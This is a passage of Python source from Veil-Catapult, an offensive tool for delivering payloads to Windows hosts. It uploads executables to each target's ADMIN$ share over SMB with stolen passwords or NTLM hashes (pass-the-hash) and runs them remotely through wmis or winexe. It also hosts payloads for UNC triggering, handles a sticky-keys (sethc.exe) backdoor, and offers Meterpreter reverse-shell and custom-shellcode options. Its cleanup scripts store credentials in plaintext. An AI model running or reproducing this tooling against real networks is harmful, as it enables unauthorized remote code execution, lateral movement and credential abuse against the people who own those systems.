    # sleep so the wmis/winexe commands can trigger and the target
    # can grab the .exe from the SMB server
    time.sleep(7)

    # only write out our cleanup script if there were some results
    if cleanup != "":
        cleanupFileNameBase =  datetime.datetime.fromtimestamp(time.time()).strftime('%m.%d.%Y.%H%M%S') + ".rc"
        cleanupFileName = os.path.join(settings.CATAPULT_RESOURCE_PATH, cleanupFileNameBase)
        cleanupFile = open(cleanupFileName, 'w')
        cleanupFile.write(cleanup)
        cleanupFile.close()

        print "\n [*] Cleanup script written to " + cleanupFileNameBase
        print " [*] run with \"./Veil-Catapult.py -r " + cleanupFileName + "\"\n"

    server.shutdown()

    print color(" [*] Payload hosting and UNC triggering complete!")

    # remove the temporary hosted file
    os.system("rm /tmp/shared/" + hostedFileName + " 2>/dev/null" )

    # kill everything off.. think this is because of the SMB server shit
    os.kill(os.getpid(), signal.SIGINT)


def uploadTrigger(payloadPath, triggerMethod, targets, username, password):
    """
    Take a particular exe at "payloadFile" path and upload it to each 
    target in targets using the specified username and password.
    Then use WMIS or WINEXE to trigger the uploaded .exes. Cleanup commands 
    are written to "script".

    payloadPath = the local path to the .exe to upload
    targets = a list of targets
    username = the username to use
    password = the password/hash to use
    script = the cleanup script to write to

    """

    title()

    hashes = None
    cleanup = ""
    smb_domain, smb_username = "", ""

    # if username = domain/username, extract the domain
    # used for smb,.login()
    if len(username.split("/")) == 2:
        smb_domain, smb_username = username.split("/")
    else:
        # if no domain, keep the username the same
        smb_username = username

    # check if the supplied cred is a LM:NTLM hash
    if re.match(r'[0-9A-Za-z]{32}:[0-9A-Za-z]{32}', password):
        hashes = password

    # upload and trigger the payload for each target 
    for target in targets:
        
        try:
            # randomize our upload .exe name
            uploadFileName = helpers.randomString(length=8) + ".exe"
            success=True
            
            smb = SMBConnection('*SMBSERVER', target)
            
            if hashes:
                lm,nt = hashes.split(":")
                smb.login(smb_username, None, lmhash=lm, nthash=nt, domain=smb_domain)
            else:
                smb.login(smb_username, password, domain=smb_domain)
            
            # use an smb handler to upload the file
            f = open(payloadPath)
            smb.putFile("ADMIN$", uploadFileName, f.read)
            f.close()
            
            print color("\n [*] Payload successfully uploaded to " + target + ":ADMIN$\\" + uploadFileName)
            
            # close out the smb connection
            smb.logoff()

            # trigger the payload using wmis or winexe
            print " [*] Triggering payload on %s..." %(target)

            if triggerMethod == "wmis":
                out = wmisCommand(target, username, password, uploadFileName)
            else:
                out = winexeCommand(target, username, password, uploadFileName, exe=True)

            # make sure the wmis/winexe command was successful as best we can
            if out:
                if triggerMethod == "wmis":
                    if "Success" not in out:
                        if "NT_STATUS_HOST_UNREACHABLE" in out or "NT_STATUS_NO_MEMORY" in out:
                            print color(" [!] Host "+target+" unreachable", warning="True")
                            success = False
                        elif "NT_STATUS_ACCESS_DENIED" in out or "NT_STATUS_LOGON_FAILURE" in out:
                            print color(" [!] Credentials " + username + ":" + password + " failed on "+target, warning="True")
                            success = False
                        else:
                            print color(" [!] Error on "+target+": "+out, warning="True")
                            success = False
                else:
                    if "NT_STATUS_HOST_UNREACHABLE" in out or "NT_STATUS_NO_MEMORY" in out:
                        print color(" [!] Host "+target+" unreachable", warning="True")
                        success = False
                    if "NT_STATUS_ACCESS_DENIED" in out or "NT_STATUS_LOGON_FAILURE" in out:
                        print color(" [!] Credentials " + username + ":" + password + " failed on "+target, warning="True")
                        success = False

            if success:
                # if the command was successful, write out the cleanup file
                # update the cleanup script: "host username password UPLOAD_TRIGGER processname exename wmis/winexe"
                if triggerMethod == "wmis":
                    cleanup += target + " " + username + " " + password + " UPLOAD_TRIGGER wmis " + uploadFileName + " " + uploadFileName + "\n"
                else:
                    cleanup += target + " " + username + " " + password + " UPLOAD_TRIGGER winexe " + uploadFileName + " " + uploadFileName + "\n"

        except Exception as e:
            print "Exception:",e
            print color(" [!] Error on "+str(target)+" with credentials "+str(username)+":"+str(password), warning="True")
        print ""

    # only write out our cleanup script if there were some results
    if cleanup != "":
        cleanupFileNameBase =  datetime.datetime.fromtimestamp(time.time()).strftime('%m.%d.%Y.%H%M%S') + ".rc"
        cleanupFileName = os.path.join(settings.CATAPULT_RESOURCE_PATH, cleanupFileNameBase)
        cleanupFile = open(cleanupFileName, 'w')
        cleanupFile.write(cleanup)
        cleanupFile.close()

        print "\n [*] Cleanup script written to " + cleanupFileNameBase
        print " [*] run with \"./Veil-Catapult.py -r " + cleanupFileName + "\"\n"

    print color("\n [*] Payload upload and triggering complete!\n")


###############################################################
#
# Cleanup
#
###############################################################

def cleanup(cleaupScript):
    """
    Use a cleanup .rc script to killoff payload process names
    and remove the payload .exes from hosts (if specified)

    Each line in the cleanup script is in the format:
        target username pw/hash sharename processname [exename]
        (exename is optional, only written on uploadtrigger, not host trigger)
    """
    print color("\n [*] Executing cleanup script...\n")
    
    lines = []

    try:
        lines = open(cleaupScript).readlines()
    except:
        print color(" [!] Error reading file: " + cleaupScript, warning=True)
    
    for line in lines:
        parts = line.strip().split()

        if len(parts) == 5:
            target,username,pw,action,trigger = parts
            removeSethcBackdoor(target, username, pw, trigger)
            continue # skip to the next cleanup line
        if len(parts) == 6:
            target,username,pw,action,trigger,processname = parts
            exename = None
        elif len(parts) == 7:
            target,username,pw,action,trigger,processname,exename = parts
        else:
            print "\t" + color(" [!] Incorrectly formatted line: %s" % (line.strip()), warning=True)


        smb_domain, smb_username = "",""
        # if username = domain/username, extract the domain
        # used for smb,.login()
        if len(username.split("/")) == 2:
            smb_domain, smb_username = username.split("/")
        else:
            # if no domain, keep the username the same
            smb_username = username


        try:
            print " [*] %s: killing process '%s'" %(target,processname)
            killCMD = "taskkill /f /im " + processname

            # kill off the target process
            if trigger == "wmis":
                out = wmisCommand(target, username, pw, killCMD)
                if "Success" not in out:
                    print color(" [!] WMIS command unsuccessful on %s" %(target), warning=True)
                    pass
            else:
                out = winexeCommand(target, username, pw, killCMD)

                if "NT_STATUS_HOST_UNREACHABLE" in out or "NT_STATUS_NO_MEMORY" in out:
                    print color(" [!] Host "+target+" unreachable", warning="True")
                elif "NT_STATUS_CONNECTION_REFUSED" in out:
                    print color(" [!] Host "+target+" reachable but port not open", warning="True") 
                elif "NT_STATUS_ACCESS_DENIED" in out or "NT_STATUS_LOGON_FAILURE" in out:
                    print color(" [!] Credentials " + username + ":" + password + " failed on "+target, warning="True")
                else: pass

            # remove the .exe if it was uploaded to disk
            if exename:
                print " [*] %s: removing file '%s'\n" %(target,exename)
                
                smb = SMBConnection('*SMBSERVER', target)
                if re.match(r'[0-9A-Za-z]{32}:[0-9A-Za-z]{32}', pw):
                    lm,nt = pw.split(":")
                    smb.login(smb_username, None, lmhash=lm, nthash=nt, domain=smb_domain)
                else:
                    smb.login(smb_username, pw, domain=smb_domain)
                smb.deleteFile("ADMIN$", exename)
                smb.logoff()

        except: pass # ignore any errors, i.e. file not found"

    print color("\n [*] Cleanup complete!\n")
    sys.exit()


def removeSethcBackdoor(target, username, password, triggerMethod):
    """
    Removes a sticky-keys backdoor from a specific target using username/password
    for wmis login using a reg delete command.

    Called by the cleanup script.
    """

    print " [*] Removing sethc backdoor from %s" %(target)
    
    if triggerMethod == "wmis":
        out = wmisCommand(target, username, password, "REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /f")
        if "Success" not in out:
            print color(" [!] WMIS command unsuccessful on %s" %(target), warning=True)
            pass
    else:

        out = winexeCommand(target, username, password, "REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /f")

        if "NT_STATUS_HOST_UNREACHABLE" in out or "NT_STATUS_NO_MEMORY" in out:
            print color(" [!] Host "+target+" unreachable", warning="True")
        elif "NT_STATUS_CONNECTION_REFUSED" in out:
            print color(" [!] Host "+target+" reachable but port not open", warning="True") 
        elif "NT_STATUS_ACCESS_DENIED" in out or "NT_STATUS_LOGON_FAILURE" in out:
            print color(" [!] Credentials " + username + ":" + password + " failed on "+target, warning="True")
        else: pass


if __name__ == '__main__':
    try:

        parser = argparse.ArgumentParser()
        payloadPath = ""

        # Veil-Catapult specific options
        group = parser.add_argument_group('General Veil-Catapult options')
        group.add_argument('-tL', metavar="targetlist.txt", help='IP target list')
        group.add_argument('-t', metavar="TARGET", help='Specific IP to target')
        group.add_argument('--act', metavar="ACTION", help='Action to perform [powershell, python, sethc, upexec, hostexec]')
        group.add_argument('--lip', metavar="IP", help='Local IP for payload hosting')
        group.add_argument('--wmis', action='store_true', help='Use wmis for triggering')
        group.add_argument('--winexe', action='store_true', help='Use winexe for triggering')
        group.add_argument('-nc', action='store_true', help='No confirm before lauching')
        group.add_argument('-r', metavar="cleanup.rc", help='Use resource script to kill processes and remove uploaded payloads from host.')

        group = parser.add_argument_group('Veil-Catapult authentication options')
        group.add_argument('-U', metavar="(DOMAIN/)USERNAME", help='(domain/)username to use.')
        group.add_argument('-P', metavar="PASSWORD", help='Password/hash to use.')
        group.add_argument('-cF', metavar="CREDFILE", help='Hashdump formatted credential file to use.')

        # Veil-Evasion/payload options
        group = parser.add_argument_group('Veil-Evasion payload options')
        group.add_argument('-p', metavar="PAYLOAD", nargs='?', const="list", help='Veil-Evasion payload module to generate.')
        group.add_argument('-c', metavar='OPTION=value', nargs='*', help='Custom Veil-Evasion payload module options.')
        group.add_argument('--msfpayload', metavar="windows/meterpreter/reverse_tcp", nargs='?', help='Metasploit payload to generate for shellcode payloads.')
        group.add_argument('--msfoptions', metavar="OPTION=value", nargs='*', help='Options for the specified metasploit payload.')
        group.add_argument('--custshell', metavar="\\x00...", help='Custom shellcode string to use.')
        group.add_argument('--exe', metavar="PAYLOAD.EXE", help='Path to custom .exe to deliver')

        args = parser.parse_args()

        # if we have a cleanup script, execute it
        if args.r:
            title()
            cleanup(args.r)

        # if we have an action specified, choose the appropriate menu
        if args.act:
            if args.act.lower().strip() == "powershell":
                # manually select the powershell payload menu
                powershellMenu(args)
            elif args.act.lower().strip() == "python":
                # manually select the python payload menu
                pythonMenu(args)
            elif args.act.lower().strip() == "sethc":
                # manually select the sethc backdoor menu
                sethcBackdoorMenu(args)
            elif args.act.lower().strip() == "upexec" or args.act.lower().strip() == "hostexec":
                # manually select the delivery menu- upload/execute or host/execute
                exeDeliveryMenu(args)
            else:
                print color("\n [!] Warning: invalid action specified.", warning=True)
                print color(" [!] Defaulting to main menu...\n", warning=True)
                time.sleep(3)

        # if no action specified, go to the main menu
        else:
            mainMenu(args)


    # Catch ctrl + c interrupts from the user
    except KeyboardInterrupt:
        print color("\n\n [!] Exiting...\n", warning=True)

        # enumerate all threads and KILL THEM ALL
        for thread in threading.enumerate():
            if thread.isAlive():
                try:
                    thread._Thread__stop()
                except:
                    pass
        sys.exit()

